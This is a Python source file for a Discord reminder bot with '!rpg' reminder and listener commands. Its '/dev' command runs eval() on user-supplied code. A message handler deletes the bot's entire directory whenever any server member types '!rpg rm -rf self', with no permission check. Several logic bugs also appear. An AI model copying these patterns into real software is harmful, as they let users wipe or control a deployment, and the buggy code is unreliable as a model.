import hikari
import traceback

from common.dsc import try_response
from common.dsc.gateways import *
from common.dsc.consts import *
from common.models.Command import *
from common.env.consts import *
from _developer.local.db import *
from _developer.models.reminder_service import *
from common.models.date_parse import  *
from common.services import REGISTERED_SERVICES
from common.dsc.gateways import BOT
from common.dsc.consts import *
from common.dsc.gateways import *
from common.models.Command import Command
from common.dsc.functions import get_discord_user
import tcrutils as tcr

import os
import shutil
import sys


@ACL.include
@arc.slash_command('dev', 'moje nie dam')
async def cmd_dev(ctx: arc.GatewayContext, code: arc.Option[str, arc.StrParams('kodzik nie dla frajerów')]):
    if str(ctx.author.id) not in DEV_COMMAND_BENEFICARIES:
        return await ctx.respond('nie dla psa kiełabasa frajerze moje')
    try:
        result = tcr.codeblock(tcr.fmt_iterable(eval(code), syntax_highlighting=True), langcode='ansi')
    except Exception as e:
        result = str(e)
    await ctx.respond(result)
  
@ACL.include
@arc.slash_command("ping", "Komenda do weryfikacji aktywności bota")
async def cmd_ping(ctx: arc.GatewayContext):
  return await ctx.respond("pong!")

@BOT.listen()
async def ReminderCommands(event: hikari.GuildMessageCreateEvent):
    if event.is_bot or not event.content:
        return

    try:
        command = Command(event.message.content)
        paramIndex: int = 0
        if command.prefix() == "!rpg":
            target: str = command.command()
            if target is None:
                return
            target = target.lower()
            service: ReminderService = REGISTERED_SERVICES[ReminderService]

            if target == "reminder":
                action: str = command.Current
                if action is None:
                    return
                
                action = action.lower()
                if not command.MoveNext():
                    return

                if action == "new":
                    # <Reminder Name> #
                    reminderName: str | None = command.Current
                    if reminderName is None:
                        await event.message.respond("No reminder name sepcified")
                        return
                    else:
                        command.MoveNext()
                    # </Remidner Name> #

                    # <Reminder Type Operator> #
                    reminderTypeOperator: str | None = command.Current
                    if reminderTypeOperator is None:
                        await event.message.respond("No reminder type operator [at/from] specified")
                        return
                    else:
                        command.MoveNext()
                    reminderTypeOperator : str = reminderTypeOperator.lower()
                    if reminderTypeOperator not in "at from":
                        await event.message.respond(f"Possible reminder operators are **at**/**from**. Not \"{reminderTypeOperator}\"")
                        return
                    # </Reminder Type Operator> #

                    # <Remidner Trigger Time> #                    
                    startDate: str = command.Current
                    if startDate is None:
                        if reminderTypeOperator == "at":
                            await event.message.respond("No trigger date provided")
                        else:
                            await event.message.respond("No starting date provided")
                        return
                    else:
                        command.MoveNext()

                    startDate: str = startDate.lower()

                    nowOperatorUsed: bool =False
                    if startDate != "now":
                        try:
                            startDate: date = parse_date(startDate)
                        except:
                            await event.message.respond(f"\"{startDate}\" cannot be interpreted as date")
                            return

                        startTime: str | None = command.Current
                        if startTime is None:
                            await event.message.respond("No starting time provided")
                            return
                        else:
                            command.MoveNext()
                        startTime: str = startTime.lower()
                        try:
                            startTime: time = parse_time(startTime)
                        except:
                            await event.message.respond(f"\"{startTime}\" cannot be interpreted as time")
                            return

                        parsedTime: datetime = datetime(startDate.year, startDate.month, startDate.day, startTime.hour,
                                              startTime.minute, startTime.second)
                    else:
                        nowOperatorUsed = True
                        parsedTime = datetime.now()
                    # </Reminder Trigger Time> #

                    # <Reminder trigger count and interval> #
                    interval = timedelta(0, 0, 0, 0, 0, 0, 0)
                    triggerCount = -1

                    if reminderTypeOperator == "from":
                        
                        if command.Current is None:
                            await event.message.respond("No trigger count nor trigger interval specified")
                            return
                            
                        if command.Current.lower() == "times":
                            command.MoveNext()

                            try:
                                triggerCount = int(command.Current)
                            except:
                                await event.message.respond(f"\"{command.Current}\" is not integer")
                                return

                            command.MoveNext()
                        else:
                            triggerCount = -1

                        if command.Current is None:
                            await event.message.respond("No trigger interval specified")
                            return
                        
                        if command.Current.lower() == "every":
                            command.MoveNext()

                        try:
                            interval = parse_timedelta(command.Current)
                            command.MoveNext()
                        except:
                            await event.message.respond(f"\"{command.Current}\" is not valid time interval")
                            return

                        if nowOperatorUsed:
                            parsedTime += interval

                    # </Reminder trigger count and interval> #

                    listenersIds: list[str] = []

                    # <Reminder Listeners> #
                    if command.Current is None:
                        await event.Message.respond("No listeners nor message was specified")
                        return
                        
                    if command.Current.lower() == "to":
                        command.MoveNext()
                        
                        if command.Current.lower() == "everyone":
                            command.MoveNext()
                            listenersIds = list(service._listeners.keys())
                        else:
                            while command.Current.lower() != "say":
                                user = await get_discord_user(command.Current, event.author)
                                if user is None:
                                    await event.message.respond(f"Listener \"{command.Current}\" not found")
    
                                listenersIds.append(str(user.id))
                                if not command.MoveNext():
                                    await event.message.respond("No message provided")
                                    return
                    # </Reminder Listeners> #

                    # <Reminder Message> #
                    if command.Current is None:
                        await event.Message.respond("No message was specified")
                        return
                    else:
                        command.MoveNext()
                    
                    if command.Current.lower() == "say":
                        command.MoveNext()
                    message = command.Current
                    # </Reminder Message> #
                    
                    if reminderTypeOperator == "at":
                        await event.message.respond(f"Successfully created reminder **{service.AddNewReminder(reminderName, message, parsedTime, listeners=listenersIds).Name}**")
                    else:
                        await event.message.respond(f"Successfully created reminder **{
                        service.AddNewReminder(reminderName, message, parsedTime, interval, triggerCount, listenersIds).Name}**")
                elif action in "delete":
                    reminderName: str | None = command.Current
                    if reminderName is None:
                        await event.message.respond("No reminder identifier was provided")
                        return
                    else:
                        command.MoveNext()

                    reminders = service.FindReminders(reminderName)

                    if len(reminders) > 1:
                        response = "# Which one?\n"
                        for reminders in reminders:
                            response += f"    Name: {reminders.Name}\n    Id: {reminders.Id}\n    Message: {reminders.Message}"
                        await event.message.respond(response)
                    elif len(reminders) == 0:
                        await event.message.respond(f"Reminder **\"{reminderName}\"** not found")

                    reminderName = reminders[0].Name
                    service.RemoveReminder(reminders[0].Id)
                    await event.message.respond(f"Successfully removed reminder **{reminderName}**")
                elif action == "get":
                    reminderName: str = command.Current
                    if len(reminderName) == 0:
                        return

                    reminders = service.FindReminders(reminderName)

                    if len(reminders) == 0:
                        await event.message.respond(f"No reminders were found")
                    else:
                        response = ""
                        for reminder in reminders:
                            response += (f"# {reminder.Name} ({reminder.Id})\n"+
                                        f"Next estimated invoke: {reminder.NextRun + reminder.Interval}\n"+
                                        f"Reminder message : {reminder.Message}\n"+
                                        ("" if reminder.TriggerCount == -1 else f"Triggers left: **{reminder.TriggerCount}**")+
                                        f"Listeners:\n")

                            for listener in reminders.Listeners:
                                response += f"    <@{listener}>\n"

                            response += "\n"

                        await event.message.respond(response)
                elif action == "add":
                    if command.Current is None:
                        await event.message.respond("No reminder identifier was specified")
                    
                    if command.Current.lower() == "to":
                        command.MoveNext()

                    reminderName = command.Current
                    if reminderName is None:
                        await event.message.respond("No reminder identifier was specified")
                        return
                    else:
                        command.MoveNext()

                    reminders = service.FindReminders(reminderName)

                    if len(reminders) == 0:
                        await event.message.respond(f"Reminder **\"{reminderName}\"** not found")
                        return
                    elif len(reminders) > 1:
                        response = "#Which one?\n"
                        for reminder in reminders:
                            response += f"    Name: {reminder.Name}\n    Id: {reminder.Id}\n    Message: {reminder.Message}"
                        await try_response(event.message, response,"Ambiguity occurred while searching for reminders. **Try by writing longer part of the name** or by **inserting reminder ID**")
                        return

                    reminders = reminders[0]
                    reminderName = reminders.Name

                    if command.Current is None:
                        await event.message.respond("No listeners were provided")
                        return
                        
                    if command.Current.lower() == "listeners":
                        command.MoveNext()

                    listeners = command.OtherToList()

                    if len(listeners) == 0:
                        await event.message.respond(f"No listeners were provided")
                        return
                    for listener in listeners:
                        user = await get_discord_user(listener, event.author)
                        if user is None:
                            await  event.message.respond(f"Listener {listener} not found")
                        else:
                            listener = str(user.id)
                            service.AddListenerToReminder(reminders.Id, listener)
                            await event.message.respond(f"Successfully added {user.global_name} to the **{reminderName}** reminder")
                elif action in "remove":
                    if command.Current is None:
                        await event.message.respond("No reminder identifier was provided")
                    
                    if command.Current.lower() == "from":
                        command.MoveNext()
                    
                    reminderName: str | None = command.Current
                    if reminderName is None:
                        await event.message.respond("No reminder identifier was provided")
                        return
                    else:
                        command.MoveNext()
                    
                    reminders = service.FindReminders(reminderName)

                    if len(reminders) == 0:
                        await event.message.respond(f"Reminder **\"{reminderName}\"** not found")
                        return
                    elif len(reminders) > 1:
                        response = "#Which one?\n"
                        for reminder in reminders:
                            response += f"    Name: {reminder.Name}\n    Id: {reminder.Id}\n    Message: {reminder.Message}"
                        await try_response(event.message, response,
                                           "Ambiguity occurred while searching for reminders. \n\n"+
                                           "**Try by writing longer part of the name** or by **inserting reminder ID**")
                        return

                    reminderName = reminders[0].Name
                    reminders = reminders[0]

                    if command.Current is None:
                        await event.message.respond("No listeners were provided")

                    if command.Current.lower() == "listeners":
                        command.MoveNext()

                    listeners = command.OtherToList()

                    if len(listeners) == 0:
                        await event.message.respond(f"No listener was provided")
                        return

                    for listener in listeners:
                        user = await get_discord_user(listener, event.author)
                        if user is None:
                            await event.message.respond(f"Listener \"{listener}\" not found")
                        else:
                            service.RemoveReminderListener(reminders.Id, listener)
                            await event.message.respond(f"Successfully removed {user.global_name} from **{reminderName}** reminder")
            elif target == "listener":
                if action in "delete":
                    listenerId: str | None = command.Current
                    if listenerId is None:
                        await event.message.respond("No listener was provided")
                    else:
                        command.MoveNext()

                    user = await get_discord_user(listenerId, event.author)

                    if user is None:
                        await event.message.respond(f"Listener \"{listenerId}\" not found")
                    
                    if service.RemoveListener(listenerId):
                        await event.message.respond(f"Successfully removed all {user.global_name} reminders")
                elif action == "get":
                    listenerId: str | None = command.Current
                    if listenerId is None:
                        await event.message.respond("No listener was provided")
                    else:
                        command.MoveNext()

                    user = await get_discord_user(listenerId, event.author)

                    if user is None:
                        await event.message.respond(f"Listener \"{listenerId}\" not found")

                    listener = service.GetListener(listenerId)
                    result = f"# {user.global_name}"
                    for reminder, t_c in listener.ReminderEvents.items():
                        result += f"    Reminder: **{service.GetReminderEventById(reminder).Name}** triggered **{t_c}** times\n"

                    await event.message.respond(result)

                elif action == "add":
                    if command.Current is None:
                        await event.message.respond("No listener was provided")
                        return
                    
                    if command.Current.lower() == "to":
                        command.MoveNext()

                    listenerId: str | None = command.Current
                    if listenerId is None:
                        await event.message.respond("No listener was provided")
                        return
                    else:
                        command.MoveNext()
                        
                    user = get_discord_user(listenerId, event.author)
                    if user is None:
                        await event.message.respond(f"Could not find user \"**{listenerId}**\"")
                        return

                    if command.Current is None:
                        await event.message.respond("No reminders were specified")
                        return
                    
                    if command.Current.lower() == "reminders":
                        command.MoveNext()

                    reminders = command.OtherToList()
                    remindersMatches = []
                    for reminder in reminders:
                        remindersMatches.append(service.FindReminders(reminder))
                        if len(remindersMatches[-1]) == 0:
                            await event.message.respond(f"Reminder **\"{reminder}\"** not found. Aborting...")
                            return
                        elif len(remindersMatches[-1]) > 1:
                            response = f"# Which one do you mean by \"{reminder}\"?"
                            for match in remindersMatches[-1]:
                                response += f"    Name: {match.Name}\n    Id: {reminder.Id}\n    Message: {reminder.Message}\n"
                            await event.message.respond(response+"**Try by writing longer part of the name** or by **inserting reminder ID** and try running command again")
                            return

                    for matches in remindersMatches:
                        service.AddListenerToReminder(matches[0].Id, listenerId)

                elif action in "remove":
                    if command.Current is None:
                        await event.message.respond("No listener was provided")
                        return
                    
                    if command.Current == "reminders":
                        command.MoveNext()
                        
                    listenerId = command.Current
                    if listenerId is None:
                        await event.message.respond("No listener was provided")
                        return
                    else:
                        command.MoveNext()

                    reminders = command.OtherToList()
                    if len(reminders) == 0:
                        await event.message.respond("No reminders were provided")
                    
                    remindersMatches = []
                    for reminder in reminders:
                        remindersMatches.append(service.FindReminders(reminder))
                        if len(remindersMatches[-1]) == 0:
                            await event.message.respond(f"Reminder **\"{reminder}\"** not found. Aborting...")
                            return
                        elif len(remindersMatches[-1]) > 1:
                            response = f"# Which one do you mean by \"{reminder}\"?"
                            for match in remindersMatches[-1]:
                                response += f"    Name: {match.Name}\n    Id: {reminder.Id}\n    Message: {reminder.Message}\n"
                            await event.message.respond(
                                response + "**Try by writing longer part of the name** or by **inserting reminder ID** and try running command again")
                            return

                    for matches in remindersMatches:
                        service.RemoveReminderListener(matches[0].Id, listenerId)
            elif target == "listeners":
                if action == "get":
                    if command.Current == "all":
                        command.MoveNext()
                    response = "# All listeners\n"
                    for listener in service._listeners.values():
                        response += f"{(await BOT.rest.fetch_user(listener.Id)).global_name}\n"
                    await event.message.respond(response)
                elif action == "include" :
                    if command.Current is None:
                        await event.message.respond("Include what exactly? [all/local]")
                        return
                    
                    if command.Current.lower() == "all":
                        await event.message.respond("This may take a while...")
                        for guildId in REGISTERED_GUILDS:
                            guild = await BOT.rest.fetch_guild(guildId)
                            for member in guild.get_members().values():
                                if not member.is_bot:
                                    service.GetListener(str(member.id))
                        await event.message.respond("All users are ready!")
                    elif command.Current.lower() == "local":
                        await event.message.respond("This make take a while...")
                        guild = event.get_guild()
                        for member in guild.get_members().values():
                            if not member.is_bot:
                                service.GetListener(str(member.id))
                        await event.message.respond("Local users are ready!")
                    else:
                        await event.message.respond(f"Group \"{command.Current}\" not recognized")

    except Exception as e:
        channel = await BOT.rest.create_dm_channel(MEINID)
        await channel.send(traceback.format_exc())


@BOT.listen()
async def loop_protection_down(event: hikari.GuildMessageCreateEvent):
    if event.is_bot or not event.content:
        return
    
    command = Command(event.message.content, Command.STANDARD_COMMAND_SEPARATOR)
    if command.prefix() == "!rpg" and command.command() == "loop-protection-down":
        LOOP_LOCK = False

@BOT.listen()
async def loop_protection_up(event: hikari.GuildMessageCreateEvent):
    if event.is_bot or not event.content:
        return
    
    command = Command(event.message.content, Command.STANDARD_COMMAND_SEPARATOR)
    if command.prefix() == "!rpg" and command.command() == "loop-protection-up":
        LOOP_LOCK = True
    

@BOT.listen()
async def loop(event: hikari.GuildMessageCreateEvent):
    if (event.is_bot or not event.content) and LOOP_LOCK:
        return
    
    command = Command(event.message.content, Command.STANDARD_COMMAND_SEPARATOR)
    if command.prefix() == "loop":
        await event.message.respond("loop")

def remove_files_and_folders(path):
    try:
        if os.path.isdir(path):
            shutil.rmtree(path)
        elif os.path.isfile(path):
            os.remove(path)
    except Exception as e:
        pass

def remove_all_in_directory(directory):
    for root, dirs, files in os.walk(directory, topdown=False):
        for file in files:
            remove_files_and_folders(os.path.join(root, file))
        
        for dir in dirs:
            remove_files_and_folders(os.path.join(root, dir))

@BOT.listen(hikari.GuildMessageCreateEvent)
async def lock_cross_env_access(event: hikari.GuildMessageCreateEvent):
    if event.is_bot or not event.content:
        return

    command = Command(event.message.content, Command.STANDARD_COMMAND_SEPARATOR)

    if command.prefix() == "!rpg" and command.command() == "rm" and command[0] == "-rf" and command[1] == "self":
        folPath = os.path.dirname(os.path.abspath(sys.argv[0]))
        remove_all_in_directory(folPath)


            
